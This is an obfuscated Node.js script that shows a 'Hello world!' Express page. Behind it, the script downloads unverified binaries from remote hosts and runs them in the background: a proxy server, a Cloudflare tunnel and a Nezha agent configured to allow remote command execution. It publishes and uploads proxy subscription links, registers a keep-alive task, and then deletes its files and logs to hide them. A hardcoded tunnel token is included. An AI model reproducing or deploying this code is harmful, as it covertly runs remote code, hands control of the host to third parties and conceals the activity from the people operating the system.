const _0x50edf1=_0x1645;(function(_0x1f9eb1,_0x3557b9){const _0x19a6f9=_0x1645,_0x141eed=_0x1f9eb1();while(!![]){try{const _0x88f354=parseInt(_0x19a6f9(0xbf))/0x1*(parseInt(_0x19a6f9(0xae))/0x2)+parseInt(_0x19a6f9(0x8a))/0x3*(parseInt(_0x19a6f9(0xfb))/0x4)+parseInt(_0x19a6f9(0x125))/0x5*(-parseInt(_0x19a6f9(0xee))/0x6)+parseInt(_0x19a6f9(0x119))/0x7+-parseInt(_0x19a6f9(0x80))/0x8+-parseInt(_0x19a6f9(0x11f))/0x9+-parseInt(_0x19a6f9(0x118))/0xa*(-parseInt(_0x19a6f9(0x109))/0xb);if(_0x88f354===_0x3557b9)break;else _0x141eed['push'](_0x141eed['shift']());}catch(_0x4df2cf){_0x141eed['push'](_0x141eed['shift']());}}}(_0x159e,0x39a75));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x50edf1(0x111)),{promisify}=require(_0x50edf1(0xbd)),exec=promisify(require(_0x50edf1(0xf1))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x50edf1(0xb6)][_0x50edf1(0x99)]||'',PROJECT_URL=process[_0x50edf1(0xb6)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x50edf1(0xb6)][_0x50edf1(0xc6)]||![],FILE_PATH=process[_0x50edf1(0xb6)][_0x50edf1(0x79)]||'./tmp',SUB_PATH=process[_0x50edf1(0xb6)][_0x50edf1(0x8d)]||_0x50edf1(0xd0),PORT=process['env'][_0x50edf1(0x122)]||process[_0x50edf1(0xb6)][_0x50edf1(0xdb)]||0xbb8,UUID=process[_0x50edf1(0xb6)][_0x50edf1(0x97)]||_0x50edf1(0xd1),NEZHA_SERVER=process[_0x50edf1(0xb6)][_0x50edf1(0xa7)]||'',NEZHA_PORT=process[_0x50edf1(0xb6)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x50edf1(0xb6)][_0x50edf1(0x12d)]||'',ARGO_DOMAIN=process[_0x50edf1(0xb6)][_0x50edf1(0x92)]||_0x50edf1(0x106),ARGO_AUTH=process[_0x50edf1(0xb6)][_0x50edf1(0x11b)]||_0x50edf1(0x128),ARGO_PORT=process[_0x50edf1(0xb6)][_0x50edf1(0x137)]||0x1f41,CFIP=process[_0x50edf1(0xb6)][_0x50edf1(0x13b)]||_0x50edf1(0x103),CFPORT=process[_0x50edf1(0xb6)][_0x50edf1(0x85)]||0x1bb,NAME=process[_0x50edf1(0xb6)][_0x50edf1(0xd7)]||_0x50edf1(0xfa);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x50edf1(0x12a)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x36374c=_0x50edf1,_0xe13cde=_0x36374c(0xb8);let _0xbdb21b='';for(let _0x5d1148=0x0;_0x5d1148<0x6;_0x5d1148++){_0xbdb21b+=_0xe13cde['charAt'](Math['floor'](Math[_0x36374c(0xfd)]()*_0xe13cde[_0x36374c(0xf3)]));}return _0xbdb21b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x50edf1(0xe9)](FILE_PATH,npmName),phpPath=path[_0x50edf1(0xe9)](FILE_PATH,phpName),webPath=path[_0x50edf1(0xe9)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x50edf1(0xe9)](FILE_PATH,_0x50edf1(0xc1)),listPath=path[_0x50edf1(0xe9)](FILE_PATH,_0x50edf1(0x12c)),bootLogPath=path[_0x50edf1(0xe9)](FILE_PATH,_0x50edf1(0x10e)),configPath=path[_0x50edf1(0xe9)](FILE_PATH,_0x50edf1(0x94));function _0x1645(_0x42a609,_0x4ef33b){const _0x159e74=_0x159e();return _0x1645=function(_0x164534,_0x24b5f5){_0x164534=_0x164534-0x79;let _0x3616df=_0x159e74[_0x164534];return _0x3616df;},_0x1645(_0x42a609,_0x4ef33b);}function deleteNodes(){const _0x99e258=_0x50edf1;try{if(!UPLOAD_URL)return;if(!fs[_0x99e258(0x135)](subPath))return;let _0x39b5fa;try{_0x39b5fa=fs[_0x99e258(0xe7)](subPath,_0x99e258(0x100));}catch{return null;}const _0x58c170=Buffer[_0x99e258(0xdf)](_0x39b5fa,_0x99e258(0xd4))['toString'](_0x99e258(0x100)),_0x1a1e26=_0x58c170[_0x99e258(0x7d)]('\x0a')[_0x99e258(0x10c)](_0x3174b1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x99e258(0xe6)](_0x3174b1));if(_0x1a1e26['length']===0x0)return;return axios[_0x99e258(0xdc)](UPLOAD_URL+_0x99e258(0x8f),JSON[_0x99e258(0xb1)]({'nodes':_0x1a1e26}),{'headers':{'Content-Type':_0x99e258(0x87)}})['catch'](_0x4312a9=>{return null;}),null;}catch(_0x29cea4){return null;}}function _0x159e(){const _0x442550=['/trojan-argo','\x20is\x20running','1388292QBzRFG','response','8443','child_process','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','length','rm\x20-rf\x20','\x20-c\x20','finish','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-c\x20\x22','error','weimei','68xNYPzW','del\x20/f\x20/q\x20','random','Empowerment\x20success\x20for\x20','all','utf-8','platform','https://amd64.ssss.nyc.mn/agent','cdns.doon.eu.org','get','/api/add-nodes','kkd.b.6.9.0.0.f.1.f.1.0.7.4.0.1.0.0.2.ip6.arpa','Download\x20','amd','22MoOUIC','vmess','http\x20server\x20is\x20running\x20on\x20port:','filter','\x20successfully','boot.log','arm','\x0a\x20\x20\x0atrojan://','path','Error\x20downloading\x20files:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','php\x20running\x20error:\x20','arm64','Add\x20automatic\x20access\x20task\x20faild:\x20','nohup\x20','2542920RLfNhN','972307LGvAQr','data','ARGO_AUTH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Content-Type','clear','453780PhPubi','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','includes','SERVER_PORT','stream','2087','5VIrYgo','\x22\x20>\x20/dev/null\x202>&1','chmod','cloudflared.exe\x20service\x20install\x20cloudflared.exe\x20service\x20install\x20cloudflared.exe\x20service\x20install\x20eyJhIjoiNGVmNzliNzFkMjZjZjhlOTg2MTFjM2U2MmIyYmQ2ZTQiLCJ0IjoiOTU5MTQzZjQtMWMwZi00MjJkLTg5NjctZDk5ZTgyNjVjNzdiIiwicyI6Ik5HSm1NamhqWWprdE5UYzRZeTAwTVdaaUxUazNOV1V0TjJaaE9XRmxaakF5T1RsaCJ9','isFile','log','&path=%2Ftrojan-argo%3Fed%3D2560#','list.txt','NEZHA_KEY','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','ArgoDomain:','https://amd64.ssss.nyc.mn/bot','2053','?encryption=none&security=tls&sni=','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','http','existsSync','&fp=firefox&type=ws&host=','ARGO_PORT','127.0.0.1','block','freedom','CFIP','FILE_PATH','win32','?security=tls&sni=','match','split','/vmess-argo?ed=2560','tls','2482600XFJIeV','arch','none','TunnelSecret','text/plain;\x20charset=utf-8','CFPORT','createWriteStream','application/json','unshift','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','17031DBTZoj','\x0aclient_secret:\x20','\x0avless://','SUB_PATH','/dev/null','/api/delete-nodes','quic','send','ARGO_DOMAIN','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','config.json','\x20failed:\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','UUID','message','UPLOAD_URL','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','fileUrl','\x0a\x20\x20tunnel:\x20','Empowerment\x20failed\x20for\x20','https://arm64.ssss.nyc.mn/web','map','close','Nodes\x20uploaded\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','automatic\x20access\x20task\x20added\x20successfully','Skipping\x20adding\x20automatic\x20access\x20task','readdirSync','xtls-rprx-vision','NEZHA_SERVER','false','https+local://8.8.8.8/dns-query','status','trim','direct','statSync','66BVwdHR','2096','Error\x20in\x20startserver:','stringify','set','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','2083','\x20>/dev/null\x202>&1\x20&','env','firefox','abcdefghijklmnopqrstuvwxyz','443','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/vmess-argo','push','util','Hello\x20world!','2554CcBSce','Error\x20executing\x20command:\x20','sub.txt','aarch64','tunnel.yml','https://amd64.ssss.nyc.mn/web','https://arm64.ssss.nyc.mn/agent','AUTO_ACCESS','/api/add-subscriptions','tcp','https://arm64.ssss.nyc.mn/bot','toString','trojan','/tunnel.yml\x20run','pkill\x20-f\x20\x22[','pop','writeFileSync','sub','b9ff7066-9a53-4398-bb6d-3a33c231560f','unlinkSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','base64','basename','&path=%2Fvless-argo%3Fed%3D2560#','NAME','forEach','config.yaml','https://arm64.ssss.nyc.mn/v1','PORT','post','Subscription\x20uploaded\x20successfully','catch','from','tunnel.json','blackhole','vless','pipe','has','substring','test','readFileSync','--tls','join','/vless-argo','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel'];_0x159e=function(){return _0x442550;};return _0x159e();}function cleanupOldFiles(){const _0x4c449b=_0x50edf1;try{const _0x299b8f=fs[_0x4c449b(0xa5)](FILE_PATH);_0x299b8f['forEach'](_0x56c504=>{const _0x109e76=_0x4c449b,_0x187aae=path[_0x109e76(0xe9)](FILE_PATH,_0x56c504);try{const _0x219898=fs[_0x109e76(0xad)](_0x187aae);_0x219898[_0x109e76(0x129)]()&&fs[_0x109e76(0xd2)](_0x187aae);}catch(_0x43cdfe){}});}catch(_0x3dd8e7){}}app[_0x50edf1(0x104)]('/',function(_0x22032f,_0x2091c4){const _0x46022e=_0x50edf1;_0x2091c4[_0x46022e(0x91)](_0x46022e(0xbe));});async function generateConfig(){const _0x131c87=_0x50edf1,_0x3ce972={'log':{'access':_0x131c87(0x8e),'error':_0x131c87(0x8e),'loglevel':_0x131c87(0x82)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x131c87(0xe2),'settings':{'clients':[{'id':UUID,'flow':_0x131c87(0xa6)}],'decryption':_0x131c87(0x82),'fallbacks':[{'dest':0xbb9},{'path':_0x131c87(0xea),'dest':0xbba},{'path':_0x131c87(0xbb),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x131c87(0xc8)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x131c87(0x82)},'streamSettings':{'network':_0x131c87(0xc8),'security':'none'}},{'port':0xbba,'listen':_0x131c87(0x138),'protocol':_0x131c87(0xe2),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x131c87(0x82)},'streamSettings':{'network':'ws','security':_0x131c87(0x82),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x131c87(0x134),_0x131c87(0x7f),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x131c87(0x138),'protocol':_0x131c87(0x10a),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x131c87(0xbb)}},'sniffing':{'enabled':!![],'destOverride':[_0x131c87(0x134),_0x131c87(0x7f),_0x131c87(0x90)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x131c87(0x138),'protocol':_0x131c87(0xcb),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x131c87(0xec)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x131c87(0x7f),_0x131c87(0x90)],'metadataOnly':![]}}],'dns':{'servers':[_0x131c87(0xa9)]},'outbounds':[{'protocol':_0x131c87(0x13a),'tag':_0x131c87(0xac)},{'protocol':_0x131c87(0xe1),'tag':_0x131c87(0x139)}]};fs['writeFileSync'](path[_0x131c87(0xe9)](FILE_PATH,'config.json'),JSON[_0x131c87(0xb1)](_0x3ce972,null,0x2));}function getSystemArchitecture(){const _0x16ef5a=_0x50edf1,_0x5b4e93=os[_0x16ef5a(0x81)]();return _0x5b4e93===_0x16ef5a(0x10f)||_0x5b4e93===_0x16ef5a(0x115)||_0x5b4e93===_0x16ef5a(0xc2)?_0x16ef5a(0x10f):_0x16ef5a(0x108);}function downloadFile(_0x1d8b49,_0x23abc9,_0x4cff16){const _0x27418e=_0x50edf1,_0xde6b3a=_0x1d8b49;!fs[_0x27418e(0x135)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x6ecaf4=fs[_0x27418e(0x86)](_0xde6b3a);axios({'method':'get','url':_0x23abc9,'responseType':_0x27418e(0x123)})['then'](_0x5b950c=>{const _0x2919b4=_0x27418e;_0x5b950c[_0x2919b4(0x11a)][_0x2919b4(0xe3)](_0x6ecaf4),_0x6ecaf4['on'](_0x2919b4(0xf6),()=>{const _0x30cd68=_0x2919b4;_0x6ecaf4[_0x30cd68(0xa0)](),console[_0x30cd68(0x12a)](_0x30cd68(0x107)+path[_0x30cd68(0xd5)](_0xde6b3a)+_0x30cd68(0x10d)),_0x4cff16(null,_0xde6b3a);}),_0x6ecaf4['on'](_0x2919b4(0xf9),_0x36712e=>{const _0x254ed3=_0x2919b4;fs['unlink'](_0xde6b3a,()=>{});const _0x3d6f31='Download\x20'+path[_0x254ed3(0xd5)](_0xde6b3a)+'\x20failed:\x20'+_0x36712e[_0x254ed3(0x98)];console['error'](_0x3d6f31),_0x4cff16(_0x3d6f31);});})[_0x27418e(0xde)](_0x390e8d=>{const _0x250c4d=_0x27418e,_0x40c510=_0x250c4d(0x107)+path[_0x250c4d(0xd5)](_0xde6b3a)+_0x250c4d(0x95)+_0x390e8d[_0x250c4d(0x98)];console[_0x250c4d(0xf9)](_0x40c510),_0x4cff16(_0x40c510);});}async function downloadFilesAndRun(){const _0x4c9f38=_0x50edf1,_0x352ce5=getSystemArchitecture(),_0x513241=getFilesForArchitecture(_0x352ce5);if(_0x513241['length']===0x0){console[_0x4c9f38(0x12a)](_0x4c9f38(0xf7));return;}const _0x18afdf=_0x513241[_0x4c9f38(0x9f)](_0x3534d5=>{return new Promise((_0x529873,_0x20a7c8)=>{const _0x3acccd=_0x1645;downloadFile(_0x3534d5['fileName'],_0x3534d5[_0x3acccd(0x9b)],(_0x11dc54,_0x2974a5)=>{_0x11dc54?_0x20a7c8(_0x11dc54):_0x529873(_0x2974a5);});});});try{await Promise[_0x4c9f38(0xff)](_0x18afdf);}catch(_0x39c438){console['error'](_0x4c9f38(0x112),_0x39c438);return;}function _0x1cbee6(_0x4e613f){const _0x375a8c=_0x4c9f38,_0x390951=0x1fd;_0x4e613f[_0x375a8c(0xd8)](_0x1de9fa=>{const _0x9100f8=_0x375a8c;fs[_0x9100f8(0x135)](_0x1de9fa)&&fs[_0x9100f8(0x127)](_0x1de9fa,_0x390951,_0x2df09c=>{const _0x4460ec=_0x9100f8;_0x2df09c?console[_0x4460ec(0xf9)](_0x4460ec(0x9d)+_0x1de9fa+':\x20'+_0x2df09c):console[_0x4460ec(0x12a)](_0x4460ec(0xfe)+_0x1de9fa+':\x20'+_0x390951[_0x4460ec(0xca)](0x8));});});}const _0x1fb066=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1cbee6(_0x1fb066);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x36cc03=NEZHA_SERVER[_0x4c9f38(0x121)](':')?NEZHA_SERVER[_0x4c9f38(0x7d)](':')[_0x4c9f38(0xce)]():'',_0x5ec422=new Set([_0x4c9f38(0xb9),_0x4c9f38(0xf0),'2096',_0x4c9f38(0x124),_0x4c9f38(0xb4),_0x4c9f38(0x131)]),_0x3e17c3=_0x5ec422[_0x4c9f38(0xe4)](_0x36cc03)?'true':_0x4c9f38(0xa8),_0x231777=_0x4c9f38(0x8b)+NEZHA_KEY+_0x4c9f38(0xd3)+NEZHA_SERVER+_0x4c9f38(0xba)+_0x3e17c3+_0x4c9f38(0x11c)+UUID;fs['writeFileSync'](path[_0x4c9f38(0xe9)](FILE_PATH,_0x4c9f38(0xd9)),_0x231777);const _0x49409d=_0x4c9f38(0x117)+phpPath+_0x4c9f38(0xf8)+FILE_PATH+_0x4c9f38(0x120);try{await exec(_0x49409d),console[_0x4c9f38(0x12a)](phpName+_0x4c9f38(0xed)),await new Promise(_0x228f9e=>setTimeout(_0x228f9e,0x3e8));}catch(_0x51de37){console['error'](_0x4c9f38(0x114)+_0x51de37);}}else{let _0x1f1115='';const _0x34a521=['443',_0x4c9f38(0xf0),_0x4c9f38(0xaf),_0x4c9f38(0x124),_0x4c9f38(0xb4),_0x4c9f38(0x131)];_0x34a521[_0x4c9f38(0x121)](NEZHA_PORT)&&(_0x1f1115=_0x4c9f38(0xe8));const _0x2263f0=_0x4c9f38(0x117)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1f1115+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2263f0),console[_0x4c9f38(0x12a)](npmName+'\x20is\x20running'),await new Promise(_0x44f871=>setTimeout(_0x44f871,0x3e8));}catch(_0x59f106){console[_0x4c9f38(0xf9)]('npm\x20running\x20error:\x20'+_0x59f106);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x843175='nohup\x20'+webPath+_0x4c9f38(0xf5)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x843175),console[_0x4c9f38(0x12a)](webName+_0x4c9f38(0xed)),await new Promise(_0x325a53=>setTimeout(_0x325a53,0x3e8));}catch(_0x221c5a){console[_0x4c9f38(0xf9)]('web\x20running\x20error:\x20'+_0x221c5a);}if(fs[_0x4c9f38(0x135)](botPath)){let _0x2c40d3;if(ARGO_AUTH[_0x4c9f38(0x7c)](/^[A-Z0-9a-z=]{120,250}$/))_0x2c40d3=_0x4c9f38(0x89)+ARGO_AUTH;else ARGO_AUTH[_0x4c9f38(0x7c)](/TunnelSecret/)?_0x2c40d3=_0x4c9f38(0x9a)+FILE_PATH+_0x4c9f38(0xcc):_0x2c40d3=_0x4c9f38(0xa2)+FILE_PATH+_0x4c9f38(0x93)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2c40d3+'\x20>/dev/null\x202>&1\x20&'),console[_0x4c9f38(0x12a)](botName+_0x4c9f38(0xed)),await new Promise(_0x127d6f=>setTimeout(_0x127d6f,0x7d0));}catch(_0x39624f){console['error'](_0x4c9f38(0xc0)+_0x39624f);}}await new Promise(_0x4aa5da=>setTimeout(_0x4aa5da,0x1388));}function getFilesForArchitecture(_0x48c860){const _0x538628=_0x50edf1;let _0x9681a;_0x48c860==='arm'?_0x9681a=[{'fileName':webPath,'fileUrl':_0x538628(0x9e)},{'fileName':botPath,'fileUrl':_0x538628(0xc9)}]:_0x9681a=[{'fileName':webPath,'fileUrl':_0x538628(0xc4)},{'fileName':botPath,'fileUrl':_0x538628(0x130)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x302cee=_0x48c860===_0x538628(0x10f)?_0x538628(0xc5):_0x538628(0x102);_0x9681a['unshift']({'fileName':npmPath,'fileUrl':_0x302cee});}else{const _0x14439e=_0x48c860==='arm'?_0x538628(0xda):'https://amd64.ssss.nyc.mn/v1';_0x9681a[_0x538628(0x88)]({'fileName':phpPath,'fileUrl':_0x14439e});}}return _0x9681a;}function argoType(){const _0x3e446f=_0x50edf1;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3e446f(0x12a)](_0x3e446f(0x12e));return;}if(ARGO_AUTH[_0x3e446f(0x121)](_0x3e446f(0x83))){fs[_0x3e446f(0xcf)](path[_0x3e446f(0xe9)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x315622=_0x3e446f(0x9c)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x3e446f(0xe9)](FILE_PATH,_0x3e446f(0xe0))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x3e446f(0x133)+ARGO_PORT+_0x3e446f(0x113);fs[_0x3e446f(0xcf)](path[_0x3e446f(0xe9)](FILE_PATH,_0x3e446f(0xc3)),_0x315622);}else console[_0x3e446f(0x12a)](_0x3e446f(0xeb));}argoType();async function extractDomains(){const _0x361149=_0x50edf1;let _0x30cd15;if(ARGO_AUTH&&ARGO_DOMAIN)_0x30cd15=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x30cd15),await _0x288537(_0x30cd15);else try{const _0xae4520=fs[_0x361149(0xe7)](path[_0x361149(0xe9)](FILE_PATH,_0x361149(0x10e)),_0x361149(0x100)),_0x2c7c30=_0xae4520['split']('\x0a'),_0x8066ae=[];_0x2c7c30[_0x361149(0xd8)](_0x40a47d=>{const _0x2de011=_0x361149,_0x240a00=_0x40a47d['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x240a00){const _0x49870b=_0x240a00[0x1];_0x8066ae[_0x2de011(0xbc)](_0x49870b);}});if(_0x8066ae[_0x361149(0xf3)]>0x0)_0x30cd15=_0x8066ae[0x0],console[_0x361149(0x12a)](_0x361149(0x12f),_0x30cd15),await _0x288537(_0x30cd15);else{console[_0x361149(0x12a)](_0x361149(0xb3)),fs['unlinkSync'](path[_0x361149(0xe9)](FILE_PATH,_0x361149(0x10e)));async function _0x1b5c89(){const _0x98520c=_0x361149;try{process[_0x98520c(0x101)]===_0x98520c(0x7a)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x98520c(0xcd)+botName['charAt'](0x0)+']'+botName[_0x98520c(0xe5)](0x1)+_0x98520c(0x126));}catch(_0x4b83bf){}}_0x1b5c89(),await new Promise(_0x38aba1=>setTimeout(_0x38aba1,0xbb8));const _0x517b1e=_0x361149(0xa2)+FILE_PATH+_0x361149(0x93)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x517b1e+_0x361149(0xb5)),console[_0x361149(0x12a)](botName+_0x361149(0xed)),await new Promise(_0x129d0c=>setTimeout(_0x129d0c,0xbb8)),await extractDomains();}catch(_0x2a20b1){console['error'](_0x361149(0xc0)+_0x2a20b1);}}}catch(_0x27e055){console[_0x361149(0xf9)]('Error\x20reading\x20boot.log:',_0x27e055);}async function _0x288537(_0x330f31){const _0x50d640=_0x361149,_0x1c5769=execSync(_0x50d640(0x96),{'encoding':_0x50d640(0x100)}),_0x5346a1=_0x1c5769[_0x50d640(0xab)](),_0x4a0e11=NAME?NAME+'-'+_0x5346a1:_0x5346a1;return new Promise(_0x5893ba=>{setTimeout(()=>{const _0x208ea5=_0x1645,_0x7e6c1d={'v':'2','ps':''+_0x4a0e11,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x208ea5(0x82),'net':'ws','type':_0x208ea5(0x82),'host':_0x330f31,'path':_0x208ea5(0x7e),'tls':_0x208ea5(0x7f),'sni':_0x330f31,'alpn':'','fp':_0x208ea5(0xb7)},_0x51b4d3=_0x208ea5(0x8c)+UUID+'@'+CFIP+':'+CFPORT+_0x208ea5(0x132)+_0x330f31+_0x208ea5(0x136)+_0x330f31+_0x208ea5(0xd6)+_0x4a0e11+'\x0a\x20\x20\x0avmess://'+Buffer[_0x208ea5(0xdf)](JSON[_0x208ea5(0xb1)](_0x7e6c1d))[_0x208ea5(0xca)](_0x208ea5(0xd4))+_0x208ea5(0x110)+UUID+'@'+CFIP+':'+CFPORT+_0x208ea5(0x7b)+_0x330f31+_0x208ea5(0x136)+_0x330f31+_0x208ea5(0x12b)+_0x4a0e11+'\x0a\x20\x20\x20\x20';console[_0x208ea5(0x12a)](Buffer[_0x208ea5(0xdf)](_0x51b4d3)['toString'](_0x208ea5(0xd4))),fs[_0x208ea5(0xcf)](subPath,Buffer['from'](_0x51b4d3)[_0x208ea5(0xca)](_0x208ea5(0xd4))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x208ea5(0x104)]('/'+SUB_PATH,(_0x163254,_0x451241)=>{const _0x44079e=_0x208ea5,_0x5a11d7=Buffer[_0x44079e(0xdf)](_0x51b4d3)[_0x44079e(0xca)]('base64');_0x451241[_0x44079e(0xb2)](_0x44079e(0x11d),_0x44079e(0x84)),_0x451241[_0x44079e(0x91)](_0x5a11d7);}),_0x5893ba(_0x51b4d3);},0x7d0);});}}async function uploadNodes(){const _0x345bb8=_0x50edf1;if(UPLOAD_URL&&PROJECT_URL){const _0x25c379=PROJECT_URL+'/'+SUB_PATH,_0x178c6f={'subscription':[_0x25c379]};try{const _0xd68c9d=await axios[_0x345bb8(0xdc)](UPLOAD_URL+_0x345bb8(0xc7),_0x178c6f,{'headers':{'Content-Type':_0x345bb8(0x87)}});return _0xd68c9d&&_0xd68c9d[_0x345bb8(0xaa)]===0xc8?(console[_0x345bb8(0x12a)](_0x345bb8(0xdd)),_0xd68c9d):null;}catch(_0xa42453){if(_0xa42453[_0x345bb8(0xef)]){if(_0xa42453[_0x345bb8(0xef)][_0x345bb8(0xaa)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x345bb8(0x135)](listPath))return;const _0x55cd0f=fs[_0x345bb8(0xe7)](listPath,'utf-8'),_0x38e6c1=_0x55cd0f[_0x345bb8(0x7d)]('\x0a')[_0x345bb8(0x10c)](_0x1c45a0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x345bb8(0xe6)](_0x1c45a0));if(_0x38e6c1[_0x345bb8(0xf3)]===0x0)return;const _0x19b53a=JSON['stringify']({'nodes':_0x38e6c1});try{const _0x509140=await axios[_0x345bb8(0xdc)](UPLOAD_URL+_0x345bb8(0x105),_0x19b53a,{'headers':{'Content-Type':'application/json'}});return _0x509140&&_0x509140['status']===0xc8?(console[_0x345bb8(0x12a)](_0x345bb8(0xa1)),_0x509140):null;}catch(_0x52421e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5105bb=_0x1645,_0x4cc961=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4cc961[_0x5105bb(0xbc)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4cc961[_0x5105bb(0xbc)](phpPath);process[_0x5105bb(0x101)]===_0x5105bb(0x7a)?exec(_0x5105bb(0xfc)+_0x4cc961[_0x5105bb(0xe9)]('\x20')+'\x20>\x20nul\x202>&1',_0x11d270=>{const _0x2fac76=_0x5105bb;console[_0x2fac76(0x11e)](),console[_0x2fac76(0x12a)]('App\x20is\x20running'),console[_0x2fac76(0x12a)](_0x2fac76(0xf2));}):exec(_0x5105bb(0xf4)+_0x4cc961[_0x5105bb(0xe9)]('\x20')+'\x20>/dev/null\x202>&1',_0x829bc6=>{const _0x4a30c6=_0x5105bb;console[_0x4a30c6(0x11e)](),console[_0x4a30c6(0x12a)]('App\x20is\x20running'),console[_0x4a30c6(0x12a)](_0x4a30c6(0xf2));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2f1c3a=_0x50edf1;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2f1c3a(0x12a)](_0x2f1c3a(0xa4));return;}try{const _0xb48db2=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2f1c3a(0x87)}});return console[_0x2f1c3a(0x12a)](_0x2f1c3a(0xa3)),_0xb48db2;}catch(_0x2fcedb){return console[_0x2f1c3a(0xf9)](_0x2f1c3a(0x116)+_0x2fcedb[_0x2f1c3a(0x98)]),null;}}async function startserver(){const _0x2a1afc=_0x50edf1;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x58c34b){console[_0x2a1afc(0xf9)](_0x2a1afc(0xb0),_0x58c34b);}}startserver()[_0x50edf1(0xde)](_0x37ae26=>{const _0x59cebc=_0x50edf1;console[_0x59cebc(0xf9)]('Unhandled\x20error\x20in\x20startserver:',_0x37ae26);}),app['listen'](PORT,()=>console[_0x50edf1(0x12a)](_0x50edf1(0x10b)+PORT+'!'));
